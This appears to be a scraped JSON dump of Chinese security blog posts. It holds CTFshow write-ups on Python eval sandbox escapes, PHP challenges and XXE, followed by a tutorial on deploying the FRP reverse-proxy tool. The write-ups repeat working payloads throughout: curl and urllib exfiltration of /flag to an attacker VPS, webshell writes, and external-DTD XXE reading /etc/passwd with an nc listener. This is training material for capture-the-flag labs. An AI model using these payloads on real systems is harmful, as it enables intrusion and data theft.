1234re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\\'|&quot;|\\+|[0-9]') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;' 我们用request.args.get方法获取参数值即可。request.args.get 是 Flask 框架中获取 URL 查询参数（即 GET 请求中 URL 中 ?key=value 部分参数）的方法 payload： 1?code=str(exec(request.args.get(request.method)))&amp;GET=import os;os.system('curl http://你的vps地址:端口?p=`cat /flag`') web443把request过滤了，关键代码如下 1234re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\\'|&quot;|\\+|[0-9]|request') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;' 题目提示提交参数为POST，那我们后面用POST提交数据 这题我们可以继续用request.args.get，不过里面的request需要变换一下。我们打印全局变量出来看看 1code=str(globals()) 可以看到里面有个键是request，我们要利用的就是这个。由于Python 中列表、元组、字符串等序列的索引是从 0 开始的，所以request所在的索引为10。又因为数字和加号被禁了，所以我们可以用True来表示1，用两个减号表示加号 因此10可以这么写 1True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True) 然后用list(globals().keys())[]来获取对应的键名，再放进globals()[]获取对应的属性和方法，从而调用args.get()获取参数值 1globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]] 可以把这个理解为request，那么request.args.get(request.method)就等于 1globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method) 然后在路径后面拼接参数POST，传入代码即可 1?POST=import os;os.system('curl http://你的vps地址:端口?p=`ls`') 到这里，我们成功把代码弄好了，可以用str函数打印出来验证一下，POST传入 1code=str(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)) 最后用exec函数运行代码即可 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=import os;os.system('curl http://你的vps地址:端口?p=`cat /flag`') web444这题的附件把代码给出来了 12345678910111213141516171819202122232425262728293031323334353637from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: return uchar return chr(inside_code)def stringQ2B(ustring): return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/',methods=['POST', 'GET'])def app_index(): if request.method == 'POST': code = request.form['code'] if code: code = stringQ2B(code) if '\\\\u' in code: return 'hacker?' if '\\\\x' in code: return 'hacker?' reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\\'|&quot;|\\+|[0-9]|request|len') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题把len过滤了，可以继续用上题的方法 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=import os;os.system('curl http://你的vps地址:端口?p=`cat /flag`') web445这题代码总体跟上题差不多，不过开头那里把os.system和os.popen去掉了 那直接调用肯定是不行的了，可以用reload函数重新加载os模块，然后再重新调用system函数 简单介绍一下reload，reload 是 Python 中用于重新加载已导入模块的函数。 作用 Python 的模块在导入时会被缓存，后续再次导入同一模块时不会重新执行模块代码，而是直接使用缓存 reload 函数可以让已经导入的模块重新执行代码，更新模块内容（相当于“刷新”模块），适合在开发或调试时修改代码后即时生效，而不需要重启程序 使用方法 Python 2 中 reload() 是内置函数，可以直接调用 Python 3 中，reload() 被移到 importlib 模块中，需要先导入使用 我们POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=from importlib import reload;reload(os);os.system('curl http://你的vps地址:端口?p=`cat /flag`') 成功得到flag web446这题相比上题把imp.reload函数去掉了 imp 是 Python 早期用于动态加载模块的内置模块，在 Python 3.4 之后，imp 模块已被废弃，不再推荐使用，而是被更强大的 importlib 模块所取代 所以这题可以继续使用上题的方法 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=from importlib import reload;reload(os);os.system('curl http://你的vps地址:端口?p=`cat /flag`') web447对比一下代码 这题过滤了挺多东西，例如用于创建和管理子进程的subprocess模块和用于测量一小段代码执行时间的timeit模块，但是不影响我们用之前的方法 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=from importlib import reload;reload(os);os.system('curl http://你的vps地址:端口?p=`cat /flag`') web448对比一下代码 这题把好多模块都设置为None，sys.modules 是一个字典，记录了所有已加载的模块。键为模块名，值为模块对象 将 sys.modules[‘模块名’] 设为 None，可以让 Python 认为该模块已被加载，但实际值为 None。这会导致后续 import 该模块时，不再真正加载，而是返回 None（或者报错） 这时我们就不能用reload了，因为 Python 会在 sys.modules 里查找，发现值为 None，而不是模块对象，于是 import 或 reload 过程中会抛出 ModuleNotFoundError 异常 我们可以用shutil模块的copy函数把os.py复制到一个新文件下，然后重新导入新模块即可 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=import shutil;shutil.copy('/usr/local/lib/python3.8/os.py','a.py');import a;a.system('curl http://你的vps地址:端口?p=`cat /flag`') web449这题把sys模块和importlib模块都禁用了，而且还删除了sys模块。之前的方法用不了 我们可以用urllib模块来发送网络请求，带出flag。urllib 是 Python 的一个标准库模块，用于处理和操作网页 URL，以及通过网络请求获取网页内容等功能。 主要功能 urllib.request：用于打开和读取 URL，发送 HTTP/HTTPS 请求，并获取响应内容 urllib.error：包含 urllib.request 相关的异常处理，如请求失败时的错误 urllib.parse：用于解析 URL，包括分解和构造 URL 的各个部分 urllib.robotparser：解析和处理网站的 robots.txt 文件，判断哪些网页允许爬取 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=a=open('/flag').read();from urllib.request import urlopen;urlopen('http://你的vps地址:端口?p='%2Ba) %2B表示加号，如果直接写加号会无法解析，需要先URL编码 web450 题目说执行phpinfo就可以拿到flag，看代码可知我们只要满足这个正则匹配即可执行代码，我们简单分析一下 ^ 和 $ 是锚点，表示匹配字符串的开始和结束 [a-z]+ 表示匹配一个或多个小写英文字母 [\\^] 表示匹配一个脱义的插入符号 ^ 举个例子，也就是abc^def^ghi，满足正则匹配只要在中间加两个^即可。两个相同的字符异或，得到0，0和另一个字符异或，得到的便是另一个字符 payload： 1?ctfshow=phpinfo^phpinfo^phpinfo 然后搜索flag web451 这题把phpinfo过滤了。前面提到，两个相同的字符异或，得到0，0和另一个字符异或，得到另一个字符，所以我们两两修改一下就好 payload： 1?ctfshow=aaabbbb^phpbbbb^aaainfo web452 这题过滤了挺多东西，但操作空间依然很大，直接执行代码就可以 1?ctfshow=echo `ls /`; 然后读取flaag payload： 1?ctfshow=echo `cat /flaag`; 后面在网上看了其他方法，可以用括号包住进行字符串拼接 1(php.info)(); web453打开网站查看源代码，可以看到提示 我们GET传入 1/ctf/show?s=XXX POST传入 1s=index.php 然后查看网页源码，可以看到index.php代码，下面展示部分代码 123456789101112131415161718192021222324class ctf{ public function show($request,$response){ $response-&gt;header('Content-Type', 'text/html; charset=utf-8'); $s=$request-&gt;post['s']; if(isset($s)){ $response-&gt;end(file_get_contents($s)); }else{ $response-&gt;end('s not found'); } } public function file($request,$response){ $response-&gt;header('Content-Type', 'text/html; charset=utf-8'); $s=$request-&gt;post['s']; if(isset($s)){ file_put_contents('shell.php', $s); $response-&gt;end('file write done in /var/www/shell.php'); }else{ $response-&gt;end('s not found'); } } public function exec($request,$response){ system('php shell.php'); $response-&gt;end('command exec done'); } 也就是我们访问路径/ctf/file，然后POST传入内容，就会被写进shell.php。接着再访问路径/ctf/exec就可以执行shell.php的代码 同样的，我们用curl外带执行系统命令即可 首先GET传入 1/ctf/file POST传入 1s=&lt;?php system('curl http://你的vps地址:端口?p=`cat f*`');?&gt; 然后访问路径/ctf/exec，最后在服务器查看结果即可 web454跟上题一样，我们先查看源码 123456789101112131415161718192021222324class ctf{ public function show($request,$response){ $response-&gt;header('Content-Type', 'text/html; charset=utf-8'); $s=$request-&gt;post['s']; if(isset($s)){ $response-&gt;end(file_get_contents($s)); }else{ $response-&gt;end('s not found'); } } public function file($request,$response){ $response-&gt;header('Content-Type', 'text/html; charset=utf-8'); $s=$request-&gt;post['s']; if(isset($s)){ file_put_contents('shell.php', $s); $response-&gt;end('file write done in /var/www/shell.php'); }else{ $response-&gt;end('s not found'); } } public function include($request,$response){ include('shell.php'); $response-&gt;end('include done'); } 这题把system换成include了，方法跟之前一样，只是最后的路径要改一下 GET传入 1/ctf/file POST传入 1s=&lt;?php system('curl http://你的vps地址:端口?p=`cat f*`');?&gt; 然后访问路径/ctf/include，最后在服务器查看结果即可 web455查看源码，这题比上题多了个reload函数，但是用处不大。同时include函数也改回exec函数了，可以用回web453的方法 12345public function reload($request,$response){ global $http; $http-&gt;reload(); $response-&gt;end('reload done'); } GET传入 1/ctf/file POST传入 1s=&lt;?php system('curl http://你的vps地址:端口?p=`cat f*`');?&gt; 然后访问路径/ctf/exec，最后在服务器查看结果 web456除去reload函数，这题源码相比web453没怎么变，就只是改了end信息，因此可以继续用之前的方法 GET传入 1/ctf/file POST传入 1s=&lt;?php system('curl http://你的vps地址:端口?p=`cat f*`');?&gt; 然后访问路径/ctf/exec，最后在服务器查看结果 web457我们看看admin类 123456class admin extends user{ public function check(){ $u= call_user_func($this-&gt;password); return $u=='admin'; }} 简单分析一下 check() 中调用了 call_user_func($this-&gt;password)： call_user_func 用于调用回调函数，参数可以是函数名字符串或可调用变量 这里 $this-&gt;password 被当成函数名调用，函数执行的结果赋给 $u 最后判断 $u 是否等于 'admin'，相等则返回 true，否则返回 false 因此我们传入p=phpinfo触发函数使其返回值为True即可，然后传入u=admin payload： 1?u=admin&amp;p=phpinfo web458这题改为$u==='admin'，变成强比较了 123456class admin extends user{ public function check(){ $u= call_user_func($this-&gt;password); return $u==='admin'; }} 因为类名为admin，我们可以给p传入get_class获取类名，然后再传入u=admin，就满足条件了 payload： 1?u=admin&amp;p=get_class web459 这题用了copy函数，PHP 中的copy()函数是用于复制文件的内置函数 语法 1bool copy ( string $source , string $dest [, resource $context ] ) $source：必需，要复制的源文件路径 $dest：必需，目标文件路径（包含文件名） $context：可选的上下文资源 我们用php伪协议即可 payload： 1?u=php://filter/read=convert.base64-encode/resource=flag.php&amp;p=1 然后访问路径/1.php读取flag的base64编码，解码即可 web460这题跟web449相比，多了一些时间检测的代码，我们看看关键部分 1234@func_set_timeout(0.7)def run(s): time.sleep(randmon.random()) return eval(s) 12345try: s=run(code) return sexcept func_timeout.exceptions.FunctionTimedOut: return exec('1') 有两个区别 1. 执行超时机制 使用了 func-timeout 库，为 run 函数设置了 0.7 秒的超时限制。这意味着如果传入的 code 执行时间超过 0.7 秒，程序会抛出 FunctionTimedOut 异常，从而中断执行 2. 随机延迟 在 run 函数中，执行 eval 之前有一个 time.sleep(random.random())。这会增加一个 0 到 1 秒之间的随机延迟 算上随机延迟，也就是我们传入的代码必须要执行时间小于0.7s 这题有些难，参考网上Y4tacker师傅的做法，可以配合urllib外带数据 payload： 12345678910111213141516171819202122232425262728293031def getNumber3(number): number = int(number) if number in [-2, -1, 0, 1]: return [&quot;~int(True)&quot;, &quot;~int(False)&quot;, &quot;int(False)&quot;, &quot;int(True)&quot;][number + 2] if number % 2: return &quot;~%s&quot; % getNumber3(~number) else: return &quot;(%s&lt;&lt;(int(True)))&quot; % getNumber3(number / 2)def getNumber2(number): number = int(number) if number in [-2, -1, 0, 1]: return [&quot;~([]&lt;())&quot;, &quot;~([]&lt;[])&quot;, &quot;([]&lt;[])&quot;, &quot;([]&lt;())&quot;][number + 2] if number % 2: return &quot;~%s&quot; % getNumber2(~number) else: return &quot;(%s&lt;&lt;([]&lt;()))&quot; % getNumber2(number / 2)s = 'import urllib.request;import ssl;f=open(&quot;/flag&quot;).read();context = ssl._create_unverified_context();url = &quot;http://你的vps地址:端口?p=&quot;+f;request = urllib.request.Request(url);response = urllib.request.urlopen(url=request,context=context)'res = 'str().join(['for i in s: res += f&quot;chr({getNumber3(ord(i))}),&quot;res = res[:-1]res += '])'print(&quot;exec(&quot;+res+&quot;)&quot;) 把结果拼接进Body然后POST发送 1code=你的代码运行结果 简单解释一下这个代码 1s = 'import urllib.request;import ssl;f=open(&quot;/flag&quot;).read();context = ssl._create_unverified_context();url = &quot;http://你的vps地址:端口?p=&quot;+f;request = urllib.request.Request(url);response = urllib.request.urlopen(url=request,context=context)' import urllib.request：导入用于打开和读取 URL 的模块 import ssl：导入处理 TLS/SSL 连接的模块 f = open(&quot;/flag&quot;).read()：打开根目录下的 flag 文件，读取内容，并赋值给变量 f context = ssl._create_unverified_context()：创建一个不验证 SSL 证书的上下文环境，避免因证书问题阻塞请求 request = urllib.request.Request(url)：创建针对该 URL 的 HTTP 请求 response = urllib.request.urlopen(url=request, context=context)：发送请求并获取响应，使用前面创建的 SSL 上下文 参考yu22x：CTFSHOW其他篇 Y4tacker：[CTFSHOW]CTFSHOW-其他WP","link":"/posts/ctfshow-others-3-web438-web460/"},{"title":"CTFSHOW | XXE题解 web373 - web378","text":"什么是XMLXML，全称为可扩展标记语言（eXtensible Markup Language），设计宗旨是传输和存储数据 可以把它和HTML对比来理解： HTML 的标签（如&lt;h1&gt;, &lt;p&gt;）是预定义好的，主要功能是告诉浏览器如何显示内容。 XML 的标签则可以由开发者根据需求自己定义，用来清晰地描述数据的结构和含义。 举个例子 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;note&gt; &lt;to&gt;小明&lt;/to&gt; &lt;from&gt;小红&lt;/from&gt; &lt;heading&gt;提醒&lt;/heading&gt; &lt;body&gt;别忘了周五的会议！&lt;/body&gt;&lt;/note&gt; 为了更好地理解XXE，我们还需要了解XML中两个与漏洞密切相关的关键组件：DOCTYPE 和 ENTITY DOCTYPE (文档类型声明) ：它通常出现在XML文档的顶部，用于定义该文档的结构和规则。对于XXE漏洞来说，DOCTYPE最重要的作用是，它提供了一个可以定义实体（ENTITY）的地方 ENTITY (实体) ：必须在DOCTYPE声明中定义，主要有两种： 内部实体：像一个简单的文本变量，方便在文档中复用。例如：&lt;!ENTITY author &quot;Wayne&quot;&gt;，之后在文档中使用的 &amp;author; 就会被替换为 “Wayne” 外部实体：这是XXE漏洞的核心。它允许我们引用外部资源的内容，例如服务器上的一个文件或一个网址。例如：&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; 什么是XXEXXE全称是“XML外部实体注入”（XML External Entity Injection），当一个应用程序接收并解析了用户提交的XML数据，但其XML解析器配置不当时，就容易产生XXE漏洞 流程大概如下 构造一个恶意的XML文档 在文档中定义一个指向服务器本地敏感文件的外部实体，例如： &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; 在XML数据中引用这个实体 &amp;xxe; 服务器在解析这段XML时，会查找并读取 /etc/passwd 文件的内容，并用它替换掉 &amp;xxe; 最后，攻击者通过页面的回显（有回显XXE）或将数据发送到自己的服务器（无回显XXE）来窃取信息 题目列表web373题目给了源码，我们可以分析一下 1234567891011121314151617&lt;?phperror_reporting(0);//允许加载外部实体，在PHP 8.0及以上版本，此项默认为true。libxml_disable_entity_loader(false);//从HTTP请求的body中读取原始数据，一般是POST请求的内容。$xmlfile = file_get_contents('php://input');if(isset($xmlfile)){ //新建一个DOMDocument对象，用于处理XML。 $dom = new DOMDocument(); //LIBXML_NOENT: 替换XML文档中的实体；LIBXML_DTDLOAD: 允许加载外部DTD。 $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //把DOM对象转换为PHP对象。 $creds = simplexml_import_dom($dom); $ctfshow = $creds-&gt;ctfshow; echo $ctfshow;}highlight_file(__FILE__); 由源码可知，这是个有回显的XXE，因此直接POST注入即可 payload： 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;!-- 对应源码的$ctfshow = $creds-&gt;ctfshow; --&gt;&lt;creds&gt;&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;&lt;/creds&gt; web374分析源码 相比上一题，这一题少了回显代码，也就是 123$creds = simplexml_import_dom($dom);$ctfshow = $creds-&gt;ctfshow;echo $ctfshow; 因此这是个无回显的XXE，需要用到vps进行数据外带显示 payload： 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 然后在vps的网站根目录创建test.dtd 12345&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!-- “&amp;#x25;”是 % 的意思,因为是嵌套引用，所以不能直接写% --&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; out SYSTEM 'http://vps地址:1234/?x=%file;'&gt;&quot;&gt;%eval;%out; 保存文件并退出Vim：按下ESC进入命令模式，然后输入:wq并按回车键 最后在服务器用nc监听1234端口 1nc -lvvp 1234 接着发送POST请求 重新回到vps查看加密内容，然后base64解码即可 我们来分析一下思路，简单来说就是初始Payload调用了外部DTD，外部DTD中先用一个实体%eval;去定义另一个能发送数据的实体%out;，然后再调用这个新实体将文件内容外带出来 那为什么要这样子套娃，直接调用不可以吗 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % out SYSTEM &quot;http://vps地址:1234/?x=%file;&quot;&gt; %out; 如果直接调用，上面第二步中的 &lt;!ENTITY % out ...&gt; 会直接导致XML解析器报错。因为在解析器看来，%file; 这个引用被用在了另一个实体 out 的定义字符串里，这是不被允许的 因此我们需要嵌套使用，用外部实体%eval;把内层命令伪装成一个字符串，当外部实体被调用后，此时%file; 实体已经被定义过了，最后再调用%out;，就可以成功执行命令 12345&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!-- “&amp;#x25;”是 % 的意思,因为是嵌套引用，所以不能直接写% --&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; out SYSTEM 'http://vps地址:1234/?x=%file;'&gt;&quot;&gt;%eval;%out; web375先看看源码 跟上一题差不多，不过这次多了一个过滤条件，由于它是匹配整一个语句&lt;?xml version=&quot;1.0&quot;，因此有很多方法绕过 123if(preg_match('/&lt;\\?xml version=&quot;1\\.0&quot;/', $xmlfile)){ die('error');} 方法一： 在xml和version中加一个空格 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 方法二： 直接把&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;去掉 1&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 方法三： 把双引号改成单引号，即&lt;?xml version='1.0' encoding=&quot;UTF-8&quot;?&gt; 12&lt;?xml version='1.0' encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 随便选一种方法做即可，其他步骤跟上一题一样，成功得到flag web376先看源码 相比上一题，这题的过滤条件多了一个检测大小写功能，但是不影响做题，可以用上一题的方法 web377分析源码 这次多了一个http的过滤，可以用编码绕过，xml不仅支持UTF-8编码，也支持UTF-16、UTF-32和EBCDIC编码 因此我们在web375绕过&lt;?xml version=&quot;1.0&quot;的基础上，加一个编码转换即可，用python脚本完成 1234567891011import requestsurl = &quot;http://48e31982-9b66-42aa-b386-f34f7b7f8d36.challenge.ctf.show/&quot;payload = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt;&quot;&quot;&quot;payload = payload.encode('utf-16')response = requests.post(url, data=payload)print(response.text) 先在vps监听端口，然后运行脚本 web378打开题目看到一个登录框 ctrl+u查看网页源码，可以判断存在XXE漏洞 在登录框页面随便输入个账号密码，可以看到有回显，因此是属于有回显的XXE 因此我们可以构造XML payload，然后POST发送到/doLogin即可，这里用python脚本 1234567891011121314import requestsurl = &quot;http://39e1f8ce-fd5e-483d-a620-38d00350bff3.challenge.ctf.show/doLogin&quot;payload = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;&quot;&quot;&quot;response = requests.post(url, data=payload)print(response.text)","link":"/posts/ctfshow-xxe-web373-web378/"},{"title":"工具推荐 | 内网穿透神器FRP部署教程","text":"工具介绍FRP是一款高性能的反向代理工具，可以将位于NAT或防火墙后的本地服务器暴露到互联网上。目前支持TCP、UDP、HTTP和HTTPS协议，可通过域名将请求转发至内部服务，此外还提供P2P直连模式 Github地址：https://github.com/fatedier/frp 本文尽可能简单叙述，方便大家快速部署，因当前最新版是0.63.0，因此本文在0.63.0的基础上书写 准备条件 一台拥有公网IP的服务器（推荐阿里云、腾讯云等） 一个域名（非必需） 服务端安装打开https://github.com/fatedier/frp/tree/v0.63.0, 下载frp_0.63.0_linux_amd64.tar.gz 上传到服务器然后解压 1tar -zxvf frp_0.63.0_linux_amd64.tar.gz 配置cd进入frp_0.63.0_linux_amd64文件夹，输入vim frps.toml编辑frps.toml 12345678910111213141516# frp客户端与服务端连接的端口bindPort = 7000# 用来接收HTTP请求的端口vhostHTTPPort = 8088 #如端口冲突可自行切换# 认证配置[auth]token = &quot;admin_token&quot; #用于连接验证，请自行设置# Web仪表盘配置[webServer]addr = &quot;0.0.0.0&quot;port = 7500user = &quot;admin&quot; #请自行设置password = &quot;admin&quot; #请自行设置 按下ESC进入命令模式，然后输入:wq并按回车键，保存文件并退出Vim 运行为了能在后台持续运行，这里用screen启动一个新窗口 1screen -S frp #名字可以自定义 赋予执行权限 1chmod +x frps 运行脚本 1./frps -c ./frps.toml 按下组合键 ctrl+a+d 关闭当前screen窗口，运行下面的命令可以再次进入窗口 12screen -ls #查看当前screen状态screen -r frp 网页仪表盘成功运行之后，打开http://你的服务器IP:7500，即可进入仪表盘页面，可以查看当前的配置、连接等状态 客户端安装打开https://github.com/fatedier/frp/tree/v0.63.0, 下载frp_0.63.0_windows_amd64.zip 配置解压并打开文件夹，编辑frpc.toml 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot; #需要跟服务端的token保持一致，用于验证[[proxies]]name = &quot;my-web-service&quot; #可自行设置type = &quot;tcp&quot; #穿透的协议类型，ip+端口的话用tcplocalPort = 80 #需要穿透的本机端口remotePort = 8085 #指定服务端访问的端口，也就是可以通过&quot;你的服务器IP:8085&quot;访问到本机的&quot;127.0.0.1:80&quot; (可选)域名配置如果你有自己的域名，则可以进行域名配置，以获得更佳的体验 我这里用的是namesilo，其他的域名提供商也一样操作 具体操作就是在DNS Record添加一条A记录，地址填你的服务器IP，名字可以自定义，后面就通过这个子域名访问你的服务 然后打开frpc.toml重新编辑 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot; #需要跟服务端的token保持一致，用于验证[[proxies]]name = &quot;my-web-service&quot; type = &quot;http&quot; #域名+端口的话需要用httplocalPort = 80 #需要穿透的本机端口，也就是可以通过&quot;你的域名:8088&quot;访问到本机的&quot;127.0.0.1:80&quot;customDomains = [&quot;win.xxxxxx.com&quot;] #这里用你自己的域名 需要注意的是，当代理类型为 http 或 https时，访问端口由服务端的 vhostHTTPPort决定，而不是客户端的 remotePort 运行在frp_0.63.0_windows_amd64文件夹打开cmd，输入 1frpc -c frpc.toml 然后公网访问 1http://你的服务器IP:8085 如果你配置了域名，就可以公网访问 1win.xxxxxx.com:8088 实例这里我举个简单的例子，方便大家理解 无域名我在本地部署了一个DVWA漏洞靶场，假如我想把它分享给其他人，应该怎么做 在服务端部署完毕后，回到本地电脑，phpstudy打开服务 由于我的DVWA部署在本地8084端口，因此先修改frpc.toml 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot;[[proxies]]name = &quot;my-web-service&quot;type = &quot;tcp&quot;localPort = 8084 #需要穿透的本机端口remotePort = 8085 #指定服务端的端口 然后保存退出，在当前文件夹cmd执行 1frpc -c frpc.toml 接着访问你的服务器IP地址:8085即可 有域名同样是以DVWA漏洞靶场为例，先用phpstudy打开服务，然后修改frpc.toml 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot;[[proxies]]name = &quot;my-web-service&quot; type = &quot;http&quot;localPort = 8084 #需要穿透的本机端口customDomains = [&quot;win.xxxxxx.com&quot;] #这里用你自己的域名 然后保存退出，在当前文件夹cmd执行 1frpc -c frpc.toml 接着访问你的域名:8088即可 常见问题与排错 (FAQ)如果你发现连接不到服务端的端口，请检查防火墙是否放行相关端口，如果系统本身已放行端口但仍无法访问，可能是服务器提供商那边的防火墙未放行，这时需要到提供商那边（假如是阿里云）放行相关端口","link":"/posts/frp-deployment-tutorial/"}],"tags":[{"name":"应急响应","slug":"应急响应","link":"/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"玄机靶场","slug":"玄机靶场","link":"/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"},{"name":"CTFSHOW","slug":"CTFSHOW","link":"/tags/CTFSHOW/"},{"name":"CTF练习","slug":"CTF练习","link":"/tags/CTF%E7%BB%83%E4%B9%A0/"},{"name":"工具推荐","slug":"工具推荐","link":"/tags/%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/"}],"categories":[{"name":"应急响应","slug":"应急响应","link":"/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"CTFSHOW","slug":"CTFSHOW","link":"/categories/CTFSHOW/"},{"name":"工具推荐","slug":"工具推荐","link":"/categories/%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/"}],"pages":[]}